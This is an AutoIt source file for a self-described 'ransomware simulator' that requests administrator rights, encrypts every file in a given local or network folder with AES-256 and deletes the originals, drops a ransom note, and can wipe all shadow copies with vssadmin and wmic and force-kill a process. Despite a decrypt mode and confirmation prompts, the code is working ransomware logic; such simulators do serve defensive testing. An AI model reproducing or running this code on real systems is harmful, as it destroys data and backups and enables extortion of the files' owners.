#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         Mark (marktsec)

 Script Function:
	Ransomware simulator. ransomsi

   Compilation:
   C:\Program Files (x86)\AutoIt3\Aut2Exe>Aut2exe_x64.exe /in C:\Simulation\ransomsim3.au3 /out C:\Simulation\ransomsim3.exe /icon C:\Simulation\rojer_icon1.ico /x64 /console
#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here

#RequireAdmin

;#pragma compile(Icon, C:\Program Files (x86)\AutoIt3\Icons\rojer_icon1.ico)
#pragma compile(FileDescription, Ransomware Simulator)
#pragma compile(ProductName, RANSOMSIM)
#pragma compile(ProductVersion, 3.0)
#pragma compile(FileVersion, 3.0.0.0, 3.0.100.201) ; The last parameter is optional.
#pragma compile(LegalCopyright, © Mark T)
#pragma compile(LegalTrademarks, '"Ransomsim')
#pragma compile(CompanyName, 'M & T')



#include <ComboConstants.au3>
#include <Crypt.au3>
#include <GUIConstantsEx.au3>
#include <MsgBoxConstants.au3>
#include <StringConstants.au3>
#include <Array.au3>
#include <File.au3>
#include <Constants.au3>
#include <WinAPIFiles.au3>
#include <FileConstants.au3>


$helpmsg =        ' ' & @CRLF & _
				  '|  __ \     /\   | \ | |/ ____|/ __ \|  \/  |/ ____|_   _|  \/  | |__ \  / _ \     ' & @CRLF & _
				  '| |__) |   /  \  |  \| | (___ | |  | | \  / | (___   | | | \  / |    ) || | | | ' & @CRLF & _
				  '|  _  /   / /\ \ | . ` |\___ \| |  | | |\/| |\___ \  | | | |\/| |   / / | | | |  ' & @CRLF & _
				  '| | \ \  / ____ \| |\  |____) | |__| | |  | |____) |_| |_| |  | |  / /_ | |_| | ' & @CRLF & _
				  '|_|  \_\/_/    \_\_| \_|_____/ \____/|_|  |_|_____/|_____|_|  |_| |____(_)___/   ' & @CRLF & _
				  ' ' & @CRLF & _
				  ' ' & @CRLF & _
				 'Run simulation from cmd:' & @CRLF & _
			     'ransomsim3.exe <parameters>' & @CRLF & _
				 'Get simulation help - ransomsim3.exe help' & @CRLF & _
				  'Parameters:' & @CRLF & _
				  '1. Choose action: (encrypt-Commandline encrypt files, decrypt- command line Decrypt encrypted files)' & @CRLF & _
				  '2. Path to the folder to encrypt. Default - c:\ransomsimtest' & @CRLF & _
				  '3. Shadow copy delete. shadows-before - Delete shadows before encryption, shadows-after - Delete shadows after encryption.' & @CRLF & _
				  '4. Password for encryption. - Default - Password1' & @CRLF & _
				  '5. Encryption algorithm. - Default - AES (256bit)' & @CRLF & _
					 'Example:' & @CRLF & _
					 'Encrypt all files without shadow copy delete in the c:\ransomsimtest folder with Encryption algorithm AES (256bit) and password Password1.' & @CRLF & _
					 'ransomsim3.exe encrypt' & @CRLF & _
					 'Decrypt all files in the c:\ransomsimtest folder with Encryption algorithm AES (256bit) and password Password1.' & @CRLF & _
					 'ransomsim3.exe decrypt' & @CRLF & _
					 'Change default path to the folder to encrypt.' & @CRLF & _
					 'ransomsim3.exe encrypt c:\test2' & @CRLF & _
					 'Change default path to the folder to decrypt.' & @CRLF & _
					 'ransomsim3.exe decrypt C:\test2' & @CRLF & _
					 'Delete shadow copies ans encrypt files.' & @CRLF & _
					 'ransomsim3.exe encrypt C:\test2 shadows-before' & @CRLF & _
					 'Encrypt files and delete shadow copies.' & @CRLF & _
					 'ransomsim3.exe encrypt C:\test2 shadows-after' & @CRLF & _
					 'Delete shadow copies, encrypt files and set custom encryption password.' & @CRLF & _
					 'ransomsim3.exe encrypt C:\test2 shadows-before Password2' & @CRLF & _
					 'Decrypt files with custom encryption password.' & @CRLF & _
					 'ransomsim3.exe decrypt C:\test2 "" Password2' & @CRLF & _
					 'Encrypt files on the network drive via UNC path.' & @CRLF & _
					 'ransomsim3.exe decrypt \\172.21.21.18\test2' & @CRLF & _
					 'Encrypt files on the mapped network drive via mapped drive letter.' & @CRLF & _
					 'ransomsim3.exe decrypt Z:\test2'
					 
$ransom_note =  	' ' & @CRLF & _
					'!!! YOUR FILES ARE ENCRYPTED !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!' & @CRLF & _
					'Hello !!!!!!!!!!!!!!!!!!!!!!!!!' & @CRLF & _
					'Your company has been hacked! Your files are encrypted.' & @CRLF & _
					'Your personal ID: XXX-XXX-XXX' & @CRLF & _
					'If you want to decrypt your files write us: recovery@email.com'

; Get command line arguments
if $CmdLine[0] == 5 Then ; If all 5 parameters defined.
   $flagAction = $CmdLine[1] ; Action name
   $pathFolderAction = $CmdLine[2] ; Path to the folder to encrypt.
   $flagShadows = $CmdLine[3] ; shadow copy delete action.
   $sEncryptionPassword = $CmdLine[4] ; Password for encryption.
   $eAlgorithm = $CmdLine[5] ; Encryption algorithm.
ElseIf ($CmdLine[0] == 1) And ($CmdLine[1] == "help") Then
   ConsoleWrite($helpmsg & @CRLF)
   Exit
ElseIf $CmdLine[0] == 1 Then ; If only action flag defined.
   $flagAction = $CmdLine[1]
   $pathFolderAction = "c:\ransomsimtest"
   $eAlgorithm = $CALG_AES_256
   $sEncryptionPassword = "Password1"
   $flagShadows = 0
ElseIf $CmdLine[0] == 2 Then ; If only action and path defined by user.
   $flagAction = $CmdLine[1]
   $pathFolderAction = $CmdLine[2]
   $flagShadows = 0
   $sEncryptionPassword = "Password1"
   $eAlgorithm = $CALG_AES_256
ElseIf $CmdLine[0] == 3 Then ; If action, path and shadow copy delete action defined.
   $flagAction = $CmdLine[1]
   $pathFolderAction = $CmdLine[2]
   $flagShadows = $CmdLine[3]
   $sEncryptionPassword = "Password1"
   $eAlgorithm = $CALG_AES_256
ElseIf $CmdLine[0] == 4 Then ; If action, path and shadow copy delete action defined.
   $flagAction = $CmdLine[1]
   $pathFolderAction = $CmdLine[2]
   $flagShadows = $CmdLine[3]
   $sEncryptionPassword = $CmdLine[4]
   $eAlgorithm = $CALG_AES_256
Else
   MsgBox($MB_SYSTEMMODAL, "Error", "Please ensure the relevant information has been entered correctly.")
   Exit
EndIf

If $flagAction == "encrypt" And $flagShadows == 0 Then
  $verify = MsgBox(68, "", "Are you sure that you want to encrypt all files in the " & $pathFolderAction & " folder ?")
                    Select
                        Case $verify = '6'
                            EncryptCmd($pathFolderAction, $sEncryptionPassword, $eAlgorithm)
							CreateRansomNote($pathFolderAction)
                        Case $verify = '7'
                            Exit
                    EndSelect
ElseIf $flagAction == "decrypt" Then
  DecryptCmd($pathFolderAction, $sEncryptionPassword, $eAlgorithm)
ElseIf $flagAction == "encrypt" And $flagShadows == "shadows-before" Then
    $verify = MsgBox(68, "", "Are you sure that you want to DELETE ALL SHADOW COPIES and ENCRYPT all files and in the " & $pathFolderAction & " folder ?")
                    Select
                        Case $verify = '6'
                            DeleteShadowCopyVssadmin()
							DeleteShadowCopyWmic()
							KillProcessCmd()
							EncryptCmd($pathFolderAction, $sEncryptionPassword, $eAlgorithm)
							CreateRansomNote($pathFolderAction)
                        Case $verify = '7'
                            Exit
                    EndSelect
ElseIf $flagAction == "encrypt" And $flagShadows == "shadows-after" Then
    $verify = MsgBox(68, "", "Are you sure that you want to DELETE ALL SHADOW COPIES and ENCRYPT all files in the " & $pathFolderAction & " folder ?")
                    Select
                        Case $verify = '6'
							EncryptCmd($pathFolderAction, $sEncryptionPassword, $eAlgorithm)
							CreateRansomNote($pathFolderAction)
							DeleteShadowCopyVssadmin()
							DeleteShadowCopyWmic()
							KillProcessCmd()	
                        Case $verify = '7'
                            Exit
						 EndSelect
Else
   MsgBox($MB_SYSTEMMODAL, "Error", "Invalid parameter.")
   Exit
EndIf


; ##################### FUNCTIONS ##############################################################################################


; Function EncryptCmd($pathFolderAction, $sEncryptionPassword = "Password1", $eAlgorithm = $CALG_AES_256)
; $pathFolderAction - Path to the folder with files to encrypt.
; $sEncryptionPassword - Password for encryption.
; $eAlgorithm - Encryption algorithm to use. Default AES (256bit).


Func EncryptCmd($pathFolderAction, $sEncryptionPassword = "Password1", $eAlgorithm = $CALG_AES_256)
   If StringStripWS($pathFolderAction, $STR_STRIPALL) <> "" And StringStripWS($sEncryptionPassword, $STR_STRIPALL) <> "" And FileExists($pathFolderAction) Then ; Check there is a file available to encrypt and a password has been set.
	 $a_files = _FileListToArray($pathFolderAction, "*", 0, True)
		 For $i = 1 To $a_files[0]
			If _Crypt_EncryptFile($a_files[$i],$a_files[$i] & ".crypt", $sEncryptionPassword, $eAlgorithm) Then ; Encrypt the file.
				FileDelete($a_files[$i])
			Else
                    Switch @error
                        Case 30
                            MsgBox($MB_SYSTEMMODAL, "Error", "Failed to create the key.")
                        Case 2
                            MsgBox($MB_SYSTEMMODAL, "Error", "Couldn't open the source file.")
                        Case 3
                            MsgBox($MB_SYSTEMMODAL, "Error", "Couldn't open the destination file.")
                        Case 400 Or 500
                            MsgBox($MB_SYSTEMMODAL, "Error", "Encryption error.")
                        Case Else
                            MsgBox($MB_SYSTEMMODAL, "Error", "Unexpected @error = " & @error)
                    EndSwitch
	        EndIf
		 Next
		  MsgBox(0, "Your files encrypted", "Done", 5)
   Else
      MsgBox($MB_SYSTEMMODAL, "Error", "Please ensure the relevant information has been entered correctly.")
   EndIf
EndFunc


; Function DecryptCmd($pathFolderAction, $sEncryptionPassword = "Password1", $iAlgorithm = $CALG_AES_256)
; $pathFolderAction - Path to the folder with files to encrypt.
; $sEncryptionPassword - Password for decryption.
; $eAlgorithm - Decryption algorithm to use. Default AES (256bit).


Func DecryptCmd($pathFolderAction, $sEncryptionPassword = "Password1", $eAlgorithm = $CALG_AES_256)
   If StringStripWS($pathFolderAction, $STR_STRIPALL) <> "" And StringStripWS($pathFolderAction, $STR_STRIPALL) <> "" And StringStripWS($sEncryptionPassword, $STR_STRIPALL) <> "" And FileExists($pathFolderAction) Then ; Check there is a file available to decrypt and a password has been set.
	  $b_files = _FileListToArray($pathFolderAction, "*.crypt", 0, True)
		 For $j = 1 To $b_files[0]
			$sDestinationRead = StringTrimRight($b_files[$j], 6)
			If _Crypt_DecryptFile($b_files[$j], $sDestinationRead, $sEncryptionPassword, $eAlgorithm) Then ; Decrypt the file.
				 FileDelete($b_files[$j])
			Else
				  Switch @error
						Case 2
							 MsgBox($MB_SYSTEMMODAL, "Error", "Couldn't open the source file.")
						Case 3
							 MsgBox($MB_SYSTEMMODAL, "Error", "Couldn't open the destination file.")
						Case 30
							 MsgBox($MB_SYSTEMMODAL, "Error", "Failed to create the key.")
						Case 400 Or 500
							  MsgBox($MB_SYSTEMMODAL, "Error", "Decryption error.")
						Case Else
							  MsgBox($MB_SYSTEMMODAL, "Error", "Unexpected @error = " & @error)
						EndSwitch
					 EndIf
		 Next
			 MsgBox(0, "Your files decrypted", "Done", 5)
   Else
      MsgBox($MB_SYSTEMMODAL, "Error", "Please ensure the relevant information has been entered correctly.")
   EndIf
EndFunc


; Create shadow copy: wmic shadowcopy call create Volume=c:\
Func DeleteShadowCopyVssadmin()
   _WinAPI_Wow64EnableWow64FsRedirection(False)
   Local $iPID = Run(@ComSpec & ' /C vssadmin Delete Shadows /All /Quiet', @SystemDir, @SW_HIDE, $STDOUT_CHILD)
   ; Wait until the process has closed using the PID returned by Run.
   ProcessWaitClose($iPID)

   ; Read the Stdout stream of the PID returned by Run. This can also be done in a while loop. Look at the example for StderrRead.
   Local $sOutput = StdoutRead($iPID)

   ; Use StringSplit to split the output of StdoutRead to an array. All carriage returns (@CRLF) are stripped and @CRLF (line feed) is used as the delimiter.
   Local $aArray = StringSplit(StringTrimRight(StringStripCR($sOutput), StringLen(@CRLF)), @CRLF)
   If @error Then
	  MsgBox($MB_SYSTEMMODAL, "", "It appears there was an error trying to run the command.", 5)
   Else
	  ; Display the results.
	  ;_ArrayDisplay($aArray)
	  MsgBox(0, "Command Output", $sOutput, 5)
   EndIf
EndFunc

Func DeleteShadowCopyWmic()
   _WinAPI_Wow64EnableWow64FsRedirection(False)
   Local $iPID = Run(@ComSpec & ' /c ' & 'wmic SHADOWCOPY DELETE /nointeractive', "", @SW_HIDE, $STDOUT_CHILD)
   ; Wait until the process has closed using the PID returned by Run.
   ProcessWaitClose($iPID)

   ; Read the Stdout stream of the PID returned by Run. This can also be done in a while loop. Look at the example for StderrRead.
   Local $sOutput = StdoutRead($iPID)

   ; Use StringSplit to split the output of StdoutRead to an array. All carriage returns (@CRLF) are stripped and @CRLF (line feed) is used as the delimiter.
   Local $aArray = StringSplit(StringTrimRight(StringStripCR($sOutput), StringLen(@CRLF)), @CRLF)
   If @error Then
	  if $aArray[0] Then
		 MsgBox(0, "WMIC Output", $aArray[1], 5)
	  Else
		 MsgBox($MB_SYSTEMMODAL, "", "It appears there was an error trying to run the command.", 5)
	  EndIf
   Else
	  ; Display the results.
	  ;_ArrayDisplay($aArray)
	  MsgBox(0, "WMIC Output", $sOutput, 5)
   EndIf
EndFunc

Func CreateRansomNote($pathFolderAction)
	; Create file in same folder as script
	$sFileName = $pathFolderAction &"\RANSOMSIM - FILES ENCRYPTED !!!.txt"

	; Open file - deleting any existing content
	$hFilehandle = FileOpen($sFileName, $FO_OVERWRITE)	

	; Write a line
	FileWrite($hFilehandle, $ransom_note)	

	; Close the file handle
	FileClose($hFilehandle)
EndFunc	

Func KillProcessCmd($process_name = "notepad.exe")
	Local $iPID = Run(@ComSpec & ' /c ' & 'taskkill /F /IM "notepad.exe" > nul', "", @SW_HIDE, $STDOUT_CHILD)
	; Wait until the process has closed using the PID returned by Run.
	ProcessWaitClose($iPID)

	; Read the Stdout stream of the PID returned by Run. This can also be done in a while loop. Look at the example for StderrRead.
	Local $sOutput = StdoutRead($iPID)

	; Use StringSplit to split the output of StdoutRead to an array. All carriage returns (@CRLF) are stripped and @CRLF (line feed) is used as the delimiter.
	Local $aArray = StringSplit(StringTrimRight(StringStripCR($sOutput), StringLen(@CRLF)), @CRLF)
	If @error Then
		if $aArray[0] Then
			MsgBox(0, "Task kill Output", $aArray[1], 5)
		Else
			MsgBox($MB_SYSTEMMODAL, "", "It appears there was an error trying to run the command.", 5)
		EndIf
	Else
  ; Display the results.
  ;_ArrayDisplay($aArray)
		MsgBox(0, "Task kill Output", $sOutput, 5)
	EndIf
EndFunc
